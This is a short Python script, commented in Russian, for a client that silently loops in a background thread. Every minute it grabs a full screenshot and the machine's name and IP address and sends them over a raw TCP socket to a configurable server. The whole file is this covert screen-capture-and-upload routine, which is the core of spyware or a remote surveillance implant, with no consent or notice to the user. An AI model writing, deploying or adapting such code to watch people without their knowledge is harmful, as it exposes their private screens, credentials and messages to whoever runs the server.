import socket  
import os  
import time  
import platform  
from PIL import ImageGrab  
import io  
import threading  

def get_computer_info():  
    """Получает имя компьютера и IP-адрес."""  
    computer_name = platform.node()  
    ip_address = socket.gethostbyname(computer_name)  
    return computer_name, ip_address  

def send_data_to_server(data):  
    """Отправляет данные на сервер."""  
    server_address = ("localhost", 8888)  # Замените на адрес вашего сервера  
    try:  
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        client_socket.connect(server_address)  
        client_socket.send(data)  
        response = client_socket.recv(1024).decode()  
        client_socket.close()  
        return response  
    except Exception as e:  
        print(f"Error sending data to server: {e}")  
        return None  

def send_activity_to_server():  
    """Отправляет информацию о системе на сервер."""  
    computer_name, ip_address = get_computer_info()  
    data = f"ACTIVITY|{computer_name}|{ip_address}|{time.time()}"  
    response = send_data_to_server(data.encode())  
    return response  

def send_screenshot_to_server():  
    """Отправляет скриншот на сервер."""  
    screenshot = ImageGrab.grab()  
    image_data = io.BytesIO()  
    screenshot.save(image_data, format='JPEG')  
    response = send_data_to_server(image_data.getvalue())  
    return response  

def run_client():  
    """Запускает клиент и отправляет данные о системе и скриншоты на сервер."""  
    while True:  
        send_activity_to_server()  
        send_screenshot_to_server()  
        time.sleep(60)  # Отправлять данные каждую минуту  

if __name__ == "__main__":  
    # Запуск клиента в отдельном потоке  
    client_thread = threading.Thread(target=run_client)  
    client_thread.daemon = True  # Позволяет завершить поток при закрытии программы  
    client_thread.start()  

    # Бесконечный цикл для поддержания работы программы  
    while True:  
        time.sleep(1)